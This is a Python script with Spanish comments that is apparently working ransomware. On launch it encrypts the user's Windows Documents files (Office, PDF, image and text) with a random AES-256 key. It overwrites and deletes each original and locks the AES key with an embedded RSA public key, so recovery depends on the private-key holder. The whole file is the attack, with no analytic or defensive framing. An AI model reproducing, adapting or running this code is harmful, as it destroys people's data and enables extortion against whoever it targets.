import os
import shutil
import getpass
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Clave pública RSA incrustada directamente en el código
PUBLIC_RSA_KEY = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9Ecl++68RzR8L2kzvUj4
pWc0NSnXtz4BfOLqXLpYDWDIV9e1oS437VeZzf7rvxKUnjTmgu+PSU8P4ejwwN03
9+HYtxyBBE1XJDz8jGwt4hzjlWmYBgVJEiySGZL2s6LPvtE2NGEubcgylGLXNbp9
5uZsKuqP0SksLK5SHisoNxrDa86hisGyRDrKRFt2QOwKKM9TkP0LKJOGXZglAj8n
zq3mBlVbmdJU36o/CkN9iG6x1iho+VcQV3k2oMuSah3Epf3bLMmtnMe7zihi37G6
/AmcHnrJjBJ8F+a6ig3PCY+Ww6Z8kb6uXESOExDX86vmYrzMaNw9DN2pyuPcFipJ
dQIDAQAB
-----END PUBLIC KEY-----
"""

# Ruta del directorio 'Documents' del usuario
USER_PROFILE = os.path.join("C:\\Users", getpass.getuser(), "Documents")
EXTENSIONS = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']

# Generar una clave AES-256 aleatoria
def generate_aes_key():
    return get_random_bytes(32)  # 32 bytes = 256 bits

# Cifrar con AES-256 en modo CBC
def encrypt_file(file_path, aes_key):
    with open(file_path, 'rb') as f:
        file_data = f.read()

    cipher_aes = AES.new(aes_key, AES.MODE_CBC)
    ciphertext = cipher_aes.encrypt(pad(file_data, AES.block_size))

    enc_file_path = file_path + ".enc"
    with open(enc_file_path, 'wb') as enc_file:
        enc_file.write(cipher_aes.iv)
        enc_file.write(ciphertext)

    return enc_file_path

# Cifrar la clave AES con RSA-2048 usando la clave pública incrustada
def encrypt_aes_key_with_rsa(aes_key):
    public_key = RSA.import_key(PUBLIC_RSA_KEY)
    
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_key = cipher_rsa.encrypt(aes_key)
    
    with open(os.path.join(USER_PROFILE, "aes_key.enc"), 'wb') as key_file:
        key_file.write(encrypted_key)

# Eliminar de forma segura el archivo original
def securely_delete_file(file_path):
    with open(file_path, 'ba+', buffering=0) as delfile:
        length = delfile.tell()
        delfile.seek(0)
        delfile.write(b'\x00' * length)
        delfile.flush()
        os.fsync(delfile.fileno())
    os.remove(file_path)

# Recorrer los archivos en el directorio y cifrarlos
def encrypt_files_in_directory(directory):
    aes_key = generate_aes_key()

    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in EXTENSIONS):
                file_path = os.path.join(root, file)
                print(f"Cifrando {file_path}...")

                enc_file_path = encrypt_file(file_path, aes_key)
                securely_delete_file(file_path)
                print(f"Archivo original {file_path} eliminado de forma segura.")

    encrypt_aes_key_with_rsa(aes_key)
    print("Clave AES cifrada y guardada.")

# Ejecutar el cifrado en el directorio de 'Documents'
encrypt_files_in_directory(USER_PROFILE)
